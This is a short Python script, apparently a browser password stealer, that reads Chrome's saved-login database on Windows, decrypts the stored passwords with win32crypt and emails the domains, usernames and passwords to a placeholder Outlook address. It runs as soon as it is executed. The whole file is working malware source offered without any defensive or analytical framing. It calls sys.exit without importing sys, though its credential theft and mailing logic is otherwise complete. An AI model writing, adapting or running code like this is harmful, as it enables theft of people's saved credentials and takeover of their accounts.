import os
import sqlite3
import smtplib
import win32crypt
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def getpath():
    if os.name == "nt":
        PathName = os.getenv('localappdata')+'\\Google\\Chrome\\User Data\\Default\\'
        if (os.path.isdir(PathName) == False):
            sys.exit(0)
        else:
            return PathName
    
def passextractor():
    information=[]
    connection = sqlite3.connect(getpath()+"Login Data")
    with connection:
        cursor=connection.cursor()
        v=cursor.execute("""SELECT action_url,username_value, password_value FROM logins""")
        value=v.fetchall()
        for i in value:
            information.append({"Domain":i[0],"Username":i[1],"Password":win32crypt.CryptUnprotectData(i[2],None,None,None,0)[1]})
    return information

def mail(body):
    msg = MIMEMultipart() 
    msg['From'] = "Fromemail@outlook.com" 
    msg['To'] = "toemail@outlook.com" 
    msg['Subject'] = "Information list from the Baronet"
    msg.attach(MIMEText(body, 'plain')) 
 
    server = smtplib.SMTP('smtp-mail.outlook.com', 587) 
    server.starttls() 
    server.login("fromemail@outlook.com", "password") 
    text = msg.as_string() 

    server.sendmail("fromemail@outlook.com","toemail@outlook.com",text) 

def main():
    text_body=''
    for password in passextractor():
        text_body+='\n'+str(password)+'\n'
    mail(text_body)

main()
